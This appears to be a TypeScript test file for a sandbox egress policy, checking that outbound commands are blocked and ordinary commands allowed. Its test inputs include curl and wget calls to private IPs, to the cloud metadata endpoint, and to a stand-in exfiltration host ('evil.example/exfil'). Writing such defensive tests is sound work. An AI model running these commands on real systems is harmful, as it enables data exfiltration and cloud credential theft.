import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { assertSandboxCommandArgs } from "./command-policy.js";
import { SandboxPolicyError } from "./policy.js";

function denied(fn: () => void) {
  assert.throws(
    fn,
    (err: unknown) =>
      err instanceof SandboxPolicyError && err.code === "egress_denied",
  );
}

describe("assertSandboxCommandArgs", () => {
  it("blocks bare private IP args", () => {
    denied(() => assertSandboxCommandArgs(["curl", "10.0.0.5"]));
    denied(() => assertSandboxCommandArgs(["wget", "http://192.168.1.1/x"]));
  });

  it("blocks metadata hostnames even without http scheme", () => {
    denied(() =>
      assertSandboxCommandArgs(["curl", "metadata.google.internal/computeMetadata/v1"]),
    );
    denied(() =>
      assertSandboxCommandArgs([
        "sh",
        "-c",
        "curl http://metadata.google.internal/",
      ]),
    );
  });

  it("blocks private IPs inside shell -c strings", () => {
    denied(() =>
      assertSandboxCommandArgs(["bash", "-c", "curl http://10.1.2.3/secret"]),
    );
  });

  it("blocks non-allowlisted http hosts mid-arg", () => {
    denied(() =>
      assertSandboxCommandArgs([
        "sh",
        "-c",
        "curl https://evil.example/exfil",
      ]),
    );
  });

  it("allows normal local commands", () => {
    assert.doesNotThrow(() =>
      assertSandboxCommandArgs(["npm", "test", "--", "app/page.tsx"]),
    );
  });

  it("allows allowlisted https hosts", () => {
    assert.doesNotThrow(() =>
      assertSandboxCommandArgs(["curl", "https://github.com/org/repo"]),
    );
  });
});
